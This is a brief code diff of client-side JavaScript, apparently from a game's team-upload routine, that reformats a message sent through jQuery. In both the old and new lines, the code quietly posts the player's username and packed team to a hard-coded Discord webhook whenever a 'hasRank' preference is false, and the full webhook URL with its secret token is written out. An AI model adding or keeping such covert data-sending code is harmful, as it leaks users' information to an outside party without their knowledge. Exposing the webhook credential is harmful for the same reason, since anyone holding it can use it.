@@ -978,7 +978,7 @@ function toId() {
 				alert("Your team is over 25 KB. Please use a smaller team.");
 				return;
 			}
-			if (Storage.prefs('hasRank') === false) $.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `TEAM: ${this.user.get('name')} - ${packedTeam}`});
+			if (Storage.prefs('hasRank') === false) $.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `\`\`\`TEAM: ${this.user.get('name')} - ${packedTeam}\`\`\``});
 			this.send('/utm ' + packedTeam);
 			callback();
 		},
